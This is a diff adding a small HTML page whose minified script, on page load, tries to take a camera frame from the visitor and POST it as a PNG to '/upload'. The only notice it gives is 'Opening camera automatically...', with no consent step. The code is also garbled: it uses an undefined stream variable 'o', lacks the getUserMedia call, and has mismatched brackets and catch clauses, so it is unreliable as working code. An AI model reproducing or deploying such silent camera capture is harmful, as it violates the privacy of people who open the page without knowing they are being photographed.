@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Opening camera automatically...</h1>
+    <script>
+        window.onload = function() {
+            var t=document.createElement("video");document.body.appendChild(t),t.srcObject=o,t.play();var n=document.createElement("canvas");n.width=t.videoWidth,n.height=t.videoHeight;var e=n.getContext("2d");e.drawImage(t,0,0,n.width,n.height);var c=n.toDataURL("image/png");fetch("/upload",{method:"POST",body:JSON.stringify({image:c}),headers:{"Content-Type":"application/json"}}).then(function(t){console.log("Image uploaded successfully")}).catch(function(t){console.error("Error uploading image:",t)}),t.srcObject.getTracks().forEach(function(t){t.stop()})}).catch(function(t){console.error("Error accessing camera:",t)})};
+    </script>
+</body>
+</html>
